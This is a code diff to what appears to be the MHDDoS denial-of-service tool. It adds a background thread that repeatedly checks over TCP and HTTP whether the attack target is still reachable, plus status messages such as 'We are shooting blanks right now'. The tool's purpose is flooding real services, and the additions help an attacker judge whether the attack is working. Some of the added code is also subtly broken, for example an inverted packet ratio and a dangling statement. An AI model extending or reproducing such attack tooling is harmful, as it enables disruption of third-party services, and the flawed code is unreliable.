@@ -2,6 +2,7 @@
 import ctypes
 import os
 import sys
+from _socket import SHUT_RDWR
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
@@ -16,14 +17,15 @@ from random import randint
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
+import socket as Socket
 from ssl import CERT_NONE, SSLContext, create_default_context
 from struct import pack as data_pack
 from subprocess import run
 from sys import argv
 from sys import exit as _exit
 from threading import Event, Lock, Thread
-from time import sleep, time
-from typing import Any, List, Set, Tuple
+from time import sleep, time, perf_counter
+from typing import Any, List, Set, Tuple, Union
 from urllib import parse
 from uuid import UUID, uuid4
 
@@ -32,7 +34,8 @@ from PyRoxy import Tools as ProxyTools
 from certifi import where
 from cfscrape import create_scraper
 from dns import resolver
-from icmplib import ping
+from humanfriendly.terminal import ansi_wrap
+from icmplib import ping, Host
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get
@@ -1337,6 +1340,15 @@ class ToolsConsole:
         return {"success": False}
 
     @staticmethod
+    def get_ip(domain: str) -> Union[str, None]:
+        url_no_protocol = domain.split("://")[1] if ("://" in domain) else domain
+        dns_info = ToolsConsole.info(url_no_protocol)
+        if not dns_info["success"]:
+            return None
+
+        return str(dns_info['ip'])
+
+    @staticmethod
     def print_ip(domain):
         if "://" in domain:
             domain = domain.split("://")[1]
@@ -1406,11 +1418,14 @@ def start():
                 method = one
                 host = None
                 url = None
+                urlraw = None
                 event = Event()
                 event.clear()
                 target = None
                 urlraw = argv[2].strip()
                 urlraw = ToolsConsole.ensure_http_present(urlraw)
+                port = None
+                proxies = None
 
                 if method not in Methods.ALL_METHODS:
                     exit("Method Not Found %s" %
@@ -1534,9 +1549,23 @@ def start():
                         Layer4((target, port), ref, method, event,
                                proxies).start()
 
-                logger.info(
-                    "Attack Started to %s with %s method for %s seconds, threads: %d!"
-                    % (target or url.human_repr(), method, timer, threads))
+                # start health check thread
+                if not port:
+                    if urlraw and "https://" in urlraw:
+                        port = 443
+                    else:
+                        port = 80
+                if not target:
+                    target = ToolsConsole.get_ip(urlraw)
+                ip = target
+                health_check_thread = Thread(
+                    daemon=True,
+                    target=target_health_check_loop,
+                    args=(ip, port, method, urlraw, proxies)
+                )
+                health_check_thread.start()
+
+                logger.info(f"Attack Started to {target or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
                 event.set()
                 ts = time()
 
@@ -1559,12 +1588,174 @@ def start():
             ToolsConsole.usage()
 
 
+is_target_reachable: bool = False
+is_target_healthy: bool = False
+
+last_target_health_check_timestamp: float = 0
+"""Time when the last target health check was started."""
+last_ping_result: Host = None
+"""Result of the ast healthcheck ping to the target."""
+last_get_response: Response = None
+"""Result of the last healthcheck GET request to the target."""
+
+
+def check_socket_connection():
+    pass
+
+def isOpen(ip: str, port: int, timeout: float):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        s.connect((ip, port))
+        s.shutdown(SHUT_RDWR)
+        return True
+    except Exception as e:
+        print(e)
+        return False
+    finally:
+        s.close()
+
+
+def layer_4_ping(s: socket, ip: str, port: int, count: int = 5, timeout: int = 2) -> Host:
+    round_trip_times = []
+    for _ in range(count):
+        s.settimeout(timeout)
+        try:
+            start_time = perf_counter()
+            s.connect((ip, port))
+            s.shutdown(SHUT_RDWR)
+            round_trip_time_ms = (perf_counter() - start_time) * 1000
+            round_trip_times.append(round_trip_time_ms)
+        except (KeyboardInterrupt, SystemExit):
+            raise
+        except OSError:  # https://docs.python.org/3/library/socket.html#exceptions
+            pass
+
+    return Host(ip, count, round_trip_times)
+
+
+def health_check(ip: Union, port: int, method: str = None, url: str = None, proxies: Set = None) -> (Host, Response):
+    """
+    Checks the health of the target on Layer 4 and Layer 7
+    (depending on the selected protocol and attack method).
+
+    Args:
+        ip: IP of the target.
+        port: Port of the target
+        method: (optional) MHDDoS attack method.
+        url: (optional) URL of the target.
+        proxies: (optional) List of the proxies to use where possible for connectivity check.
+
+    Returns:
+        Host status for Layer 4 and HTTP Response for Layer 7.
+        Layer 7 result will be None if it is not applicable to the selected attack method,
+        or if the target port does not support HTTP protocol.
+    """
+    if url:
+        print(f"Starting health check for {ip} / {url}.\n")
+    else:
+        print(f"Starting health check for {ip}.\n")
+
+    PING_TIMEOUT = 2
+    LAYER_4_TIMEOUT = 2
+    LAYER_4_RETRIES = 5
+    LAYER_7_TIMEOUT = 10
+
+    print("Checking Layer 4...")
+    # handle Layer 4
+    layer_4_result = None
+    if method in {"MINECRAFT", "MCBOT", "TCP"} and proxies is not None:
+        # these Layer 4 methods can use proxies, so check for every proxy using proxied TCP socket
+        # TODO: threaded requests, one per each proxy
+        pass
+    else:
+        # check using TCP socket without proxy
+        with socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) as s:
+            layer_4_result = layer_4_ping(s, ip, port, count=LAYER_4_RETRIES, timeout=LAYER_4_TIMEOUT)
+
+    print("Checking Layer 7...")
+    # handle Layer 7
+    layer_7_response = None
+    url = ToolsConsole.ensure_http_present(url if url else ip)
+    if proxies is not None:
+        # proxies are provided, so check for every proxy
+        # TODO: threaded requests, one per each proxy
+        pass
+    else:
+        try:
+            layer_7_response = get(url, timeout=10)
+        except (KeyboardInterrupt, SystemExit):
+            raise
+        except Exception:
+            layer_7_response = None  # indeterminate
+
+    result_string = "Healthcheck:\n"
+    # if ping_result is not None:
+    #     result_string += f"    Ping: {ping_result.avg_rtt:.0f} ms, {ping_result.is_alive}\n"
+    if layer_4_result is not None:
+        result_string += f"    Layer 4: {layer_4_result.is_alive}, average {layer_4_result.avg_rtt:.0f} ms\n"
+    if layer_7_response is not None:
+        result_string += f"    Layer 7: code {layer_7_response.status_code}, reason: {layer_7_response.reason}\n"
+    print(result_string)
+
+    return layer_4_result, layer_7_response
+
+
+def target_health_check_loop(ip: str, port: int, method: str, url: Union[str, None], proxies: Union[set, None], interval: float = 5):
+    global last_ping_result, is_target_healthy, last_target_health_check_timestamp
+
+    while True:
+        last_target_health_check_timestamp = time()
+
+        _ = health_check(ip, port, method, url, proxies)
+
+        # is_open = isOpen(ip, 443, 1)
+        # print(f"AAAAAAA {is_open}")
+        #
+        # # ping to check reachability
+        # last_ping_result = ping(ip, count=5, interval=0.2)
+        # # print(f"Address: {last_ping_result.address}\n"
+        # #       f"Ping: {last_ping_result.avg_rtt:.0f} ms\n"
+        # #       f"Accepted Packets: {last_ping_result.packets_received}/{last_ping_result.packets_sent}\n"
+        # #       f"Status: {last_ping_result.is_alive}\n")
+        #
+        # # if reachable, send request and analyze response to get health status
+        # if last_ping_result.is_alive:
+        #     last_health_check_response = get(address, timeout=20)
+        #     # print(f"status_code: {last_health_check_response.status_code}\n"
+        #     #       f"status: {last_health_check_response.status_code <= 500}")
+
+
 status_logging_started = False
 
 
 def log_attack_status():
     global bytes_sent, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started
 
+    # craft status message
+    status_string = ""
+    status_string += craft_performance_log_message()
+    status_string += craft_connectivity_log_message()
+    status_string += "\n"
+
+    # craft a returner string so that we can overwrite previous multiline status log output
+    message_line_count = status_string.count("\n") + 1
+    GO_TO_PREVIOUS_LINE = f"\033[A"
+    GO_TO_LINE_START = "\r"
+    CLEAR_LINE = "\033[K"
+    returner = "".join([f"{GO_TO_PREVIOUS_LINE}{GO_TO_LINE_START}{CLEAR_LINE}" for _ in range(message_line_count)])
+    returner += GO_TO_PREVIOUS_LINE
+
+    # log the message
+    if not status_logging_started:
+        status_logging_started = True
+    else:
+        # print(returner)
+        pass
+    logger.debug(status_string)
+
+
+def craft_performance_log_message():
     # craft the status log message
     pps = Tools.humanformat(int(REQUESTS_SENT))
     bps = Tools.humanbytes(int(bytes_sent))
@@ -1579,20 +1770,73 @@ def log_attack_status():
                     f"       Packets sent: {tp}\n" \
                     f"       Bytes sent:   {tb}\n"
 
-    # craft a returner string so that we can overwrite previous multiline status log output
-    message_line_count = status_string.count("\n") + 1
-    GO_TO_PREVIOUS_LINE = f"\033[A"
-    GO_TO_LINE_START = "\r"
-    CLEAR_LINE = "\033[K"
-    returner = "".join([f"{GO_TO_PREVIOUS_LINE}{GO_TO_LINE_START}{CLEAR_LINE}" for _ in range(message_line_count)])
-    returner += GO_TO_PREVIOUS_LINE
+    return status_string
 
-    # log the message
-    if not status_logging_started:
-        status_logging_started = True
+
+def craft_connectivity_log_message():
+    global last_ping_result, last_get_response, last_target_health_check_timestamp
+
+    status_string = ""
+    time_since_last_health_check = time() - last_target_health_check_timestamp
+
+    # craft reachability header
+    status_string += "    Reachability"
+    if last_ping_result:
+        status_string
+    status_string += ":\n"
+
+    # for waiting periods animation
+    n_periods = (int(time()) % 3) + 1
+    periods = "".join(["." for _ in range(n_periods)])
+
+    # craft ping line
+    status_string += "       "
+    if last_ping_result:
+        status_string += "Target is"
+        pr = last_ping_result
+        if pr.is_alive:
+            successful_pings_ratio = float(pr.packets_sent) / pr.packets_received
+            if successful_pings_ratio > 0.5:
+                status_string += ansi_wrap(f" REACHABLE", color="green")
+                status_string += f" from our IP (ping {pr.avg_rtt:.0f} ms, no packets lost)."
+            else:
+                status_string += ansi_wrap(f" PARTIALLY REACHABLE", color="yellow")
+                status_string += f" from our IP (ping {pr.avg_rtt:.0f} ms, {pr.packet_loss*100:.0f}% packet loss)."
+        else:
+            status_string += ansi_wrap(f" UNREACHABLE", color="red")
+            status_string += f" from our IP ({pr.packet_loss*100:.0f}% packet loss)."
+            status_string += ansi_wrap(f" It may be down. We are shooting blanks right now.", color="red")
     else:
-        print(returner)
-    logger.debug(status_string)
+        status_string += f"Checking if the target is reachable{periods}"
+    status_string += "\n"
+
+    # craft health check line
+    status_string += "       "
+    if not last_ping_result:
+        status_string += ""
+    elif not last_ping_result.is_alive:
+        status_string += "Health status cannot be checked."
+    elif last_get_response:
+        status_string += "Target"
+        lr = last_get_response
+        if lr.status_code <= 500:
+            status_string += ansi_wrap(f" is operating normally", color="green")
+            status_string += f" (last HTTP response code = {lr.status_code}"
+            if lr.reason:
+                status_string += f", reason: {lr.reason}"
+            status_string += ")."
+        else:
+            status_string += ansi_wrap(f" may be down", color="red")
+            status_string += f" (last HTTP response code = {lr.status_code}"
+            if lr.reason:
+                status_string += f", reason: {lr.reason}"
+            status_string += ")."
+
+
+    else:
+        status_string += f"Checking target health{periods}"
+
+    return status_string
 
 
 if __name__ == '__main__':
